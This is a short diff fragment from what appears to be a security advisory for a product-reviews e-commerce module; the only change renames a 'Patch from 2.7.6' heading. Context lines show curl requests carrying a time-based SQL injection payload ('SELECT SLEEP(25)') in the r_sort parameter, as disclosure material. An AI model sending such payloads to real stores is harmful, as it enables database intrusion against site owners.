@@ -55,7 +55,7 @@ curl -v 'https://domain.tld/module/ws_productreviews/default?r_sort=date_add%60%
 curl -v 'https://domain.tld/module/ws_productreviews/default?action=getList&r_sort=date_add%60%60%3BSELECT%20SLEEP%2825%29%23'
 ```
 
-## Patch from 2.7.6
+## Patch
 
 ```diff
 --- a/ProductReviews.php
